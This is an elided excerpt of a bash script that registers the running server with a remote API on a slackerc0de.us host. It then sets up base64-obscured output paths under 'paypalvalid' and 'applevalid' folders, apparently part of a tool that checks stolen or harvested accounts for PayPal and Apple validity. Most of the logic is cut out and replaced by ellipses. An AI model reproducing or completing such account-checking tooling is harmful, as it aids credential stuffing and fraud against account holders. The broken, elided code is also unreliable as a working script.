...
[
  {
    "accessid": "'$accessid'",
    "path_to_api": "https://malhadi.slackerc0de.us/bash/api.php",
    "path_to_script": "http://slackerc0de.us/bash",
    "submitted_on": "'`date`'"
  }
]
'
	...
	if [[ $isRegistered == 'This server are not registered' ]]; then
		...
		if [[ $isEligible == "no" || $isEligible == "" ]]; then
			...
			if [[ -d "paypalvalid" ]]; then
				...
				rands=`date | sha256sum | awk '{print $1}'`; pypl=`echo $PYPL_PATH | base64 --decode`; paypalvalid_path="$path_to_script/paypalvalid/$pypl"; 
	...
	if [[ $isRegistered == 'This server are not registered' ]]; then
		...
		if [[ $isEligible == "no" || $isEligible == "" ]]; then
			...
			if [[ -d "applevalid" ]]; then
				...
				rands=`date | sha256sum | awk '{print $1}'`; aapl=`echo $AAPL_PATH | base64 --decode`; applevalid_path="$path_to_script/applevalid/$aapl"; 
